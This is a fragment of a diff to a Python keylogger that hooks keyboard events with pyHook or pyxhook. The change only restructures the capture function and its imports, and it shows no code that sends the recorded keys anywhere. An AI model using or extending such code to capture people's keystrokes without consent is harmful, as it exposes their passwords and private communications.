@@ -2,7 +2,6 @@ import win32api
 import sys
 import pythoncom, pyHook 
 import os
-from pyHook import HookManager
 
 keysPressed = ">"
 def OnKeyboardEvent(event):
@@ -16,12 +15,8 @@ def OnKeyboardEvent(event):
 def keylogger(size):
     if  os.name=="nt":
         from pyHook import HookManager
-        return keylogger_logic(size)
     else:
         from pyxhook import HookManager
-        return keylogger_logic(size)
-
-def keylogger_logic(size):       
     global keysPressed   
     hm = HookManager()  
     hm.KeyDown = OnKeyboardEvent 
